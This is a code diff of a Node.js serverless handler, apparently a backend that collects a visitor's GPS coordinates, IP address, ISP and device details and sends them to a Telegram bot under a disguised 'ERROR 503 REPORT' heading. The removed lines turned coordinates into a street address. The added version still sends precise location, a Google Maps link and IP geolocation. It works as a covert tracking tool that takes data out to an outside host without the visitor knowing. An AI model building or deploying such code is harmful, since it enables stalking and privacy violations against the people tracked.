@@ -2,109 +2,41 @@ export const config = {
   runtime: "nodejs"
 };
 
-/* ===== ESTIMASI RT/RW ===== */
-function estimateRTRW(lat, lon) {
-  if (!lat || !lon) return "-";
-  const lt = Math.abs(parseFloat(lat));
-  const ln = Math.abs(parseFloat(lon));
-  const rt = (Math.floor((lt * 1000) % 10) + 1).toString().padStart(2, "0");
-  const rw = (Math.floor((ln * 1000) % 10) + 1).toString().padStart(2, "0");
-  return `RT~${rt} / RW~${rw} (estimasi area)`;
-}
-
-/* ===== KUALITAS LOKASI ===== */
-function getLocationQuality(acc) {
-  const a = parseFloat(acc);
-  if (isNaN(a)) return "Low ❌";
-  if (a <= 20) return "High ✅";
-  if (a <= 100) return "Medium ⚠️";
-  return "Low ❌";
-}
-
-/* ===== AMBIL IP PUBLIK ===== */
-function getPublicIP(req) {
-  const raw =
-    req.headers["cf-connecting-ip"] ||
-    req.headers["x-forwarded-for"] ||
-    req.socket.remoteAddress ||
-    "";
-
-  const list = raw.split(",").map(ip => ip.trim());
-
-  for (let ip of list.reverse()) {
-    if (
-      !ip.startsWith("10.") &&
-      !ip.startsWith("192.168.") &&
-      !ip.startsWith("172.") &&
-      ip !== "::1" &&
-      !ip.startsWith("127.")
-    ) {
-      return ip.replace("::ffff:", "");
-    }
-  }
-  return "Unknown";
-}
-
 export default async function handler(req, res) {
   if (req.method !== "POST") {
     return res.status(405).send("Method Not Allowed");
   }
 
   const BOT_TOKEN = process.env.BOT_TOKEN;
-  const CHAT_ID = process.env.CHAT_ID;
+  const CHAT_ID  = process.env.CHAT_ID;
+
   if (!BOT_TOKEN || !CHAT_ID) {
     return res.status(500).send("ENV belum diset");
   }
 
   const input = req.body || {};
-  const ip = getPublicIP(req);
+
+  const ip =
+    req.headers["cf-connecting-ip"] ||
+    req.headers["x-forwarded-for"]?.split(",")[0] ||
+    req.socket.remoteAddress ||
+    "Unknown";
+
   const time = new Date().toISOString().replace("T", " ").split(".")[0];
 
-  /* ===== IP INFO ===== */
   let ipinfo = {};
-  if (ip !== "Unknown") {
-    try {
-      const r = await fetch(`https://ipapi.co/${ip}/json/`);
-      ipinfo = await r.json();
-    } catch {}
-  }
+  try {
+    const r = await fetch(`https://ipapi.co/${ip}/json/`);
+    ipinfo = await r.json();
+  } catch {}
 
-  /* ===== REVERSE GEOCODE ===== */
-  let address = {};
-  let locationSource = "GPS";
-
-  if (input.latitude && input.latitude !== "Not Allowed") {
-    try {
-      const geoRes = await fetch(
-        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${input.latitude}&lon=${input.longitude}&zoom=18&addressdetails=1`,
-        { headers: { "User-Agent": "VercelLocationBot/1.0" } }
-      );
-      const geo = await geoRes.json();
-      address = geo.address || {};
-    } catch {}
-  } else {
-    locationSource = "IP (Approximate)";
-    address = {
-      city: ipinfo.city,
-      state: ipinfo.region,
-      country: ipinfo.country_name,
-      postcode: ipinfo.postal
-    };
-  }
-
-  const locationQuality = getLocationQuality(input.accuracy);
-  const rtRwEstimate =
-    input.latitude && input.latitude !== "Not Allowed"
-      ? estimateRTRW(input.latitude, input.longitude)
-      : "-";
-
-  /* ===== PESAN TELEGRAM ===== */
-  const message = `🚨 *ERROR 503 REPORT*
+  // ===== FORMAT PESAN TELEGRAM (RAPI) =====
+  const message =
+`🚨 *ERROR 503 REPORT*
 
 ━━━━━━━━━━━━━━━━━━━━
 📱 *DEVICE INFORMATION*
 ━━━━━━━━━━━━━━━━━━━━
-📱 Brand        : ${input.brand || "-"}
 🧠 OS           : ${input.os || "-"}
 💻 Platform     : ${input.platform || "-"}
 ⚙️ CPU Cores    : ${input.cpu || "-"}
@@ -120,7 +52,8 @@ ${input.browser || "-"}
 ━━━━━━━━━━━━━━━━━━━━
 🌎 *IP INFORMATION*
 ━━━━━━━━━━━━━━━━━━━━
-🇮🇩 Country     : ${ipinfo.country_name || "-"}
+🧭 Continent    : ${ipinfo.continent_code || "-"}
+🇮🇩 Country      : ${ipinfo.country_name || "-"}
 📍 Region       : ${ipinfo.region || "-"}
 🏙 City         : ${ipinfo.city || "-"}
 🏢 ISP / Org    : ${ipinfo.org || "-"}
@@ -130,24 +63,7 @@ ${input.browser || "-"}
 ━━━━━━━━━━━━━━━━━━━━
 📐 Latitude     : ${input.latitude || "-"}
 📏 Longitude    : ${input.longitude || "-"}
-
-━━━━━━━━━━━━━━━━━━━━
-🏠 *ADDRESS INFORMATION*
-━━━━━━━━━━━━━━━━━━━━
-📍 Street       : ${address.road || "-"}
-🏘 Village      : ${address.village || address.suburb || "-"}
-🏙 District     : ${address.city_district || address.county || "-"}
-🏛 City         : ${address.city || address.town || "-"}
-🌆 Province     : ${address.state || "-"}
-📮 Postal Code : ${address.postcode || "-"}
-🌍 Country      : ${address.country || "-"}
-
-━━━━━━━━━━━━━━━━━━━━
-📐 *LOCATION QUALITY*
-━━━━━━━━━━━━━━━━━━━━
-🎯 Quality      : ${locationQuality}
-🧭 Area Estimate: ${rtRwEstimate}
-📡 Source       : ${locationSource}
+🎯 Accuracy     : ${input.accuracy || "-"}
 
 🗺 Google Maps:
 https://www.google.com/maps?q=${input.latitude},${input.longitude}
@@ -164,8 +80,9 @@ https://www.google.com/maps?q=${input.latitude},${input.longitude}
         parse_mode: "Markdown"
       })
     });
+
     return res.status(200).send("OK");
-  } catch {
+  } catch (e) {
     return res.status(500).send("Gagal kirim");
   }
 }
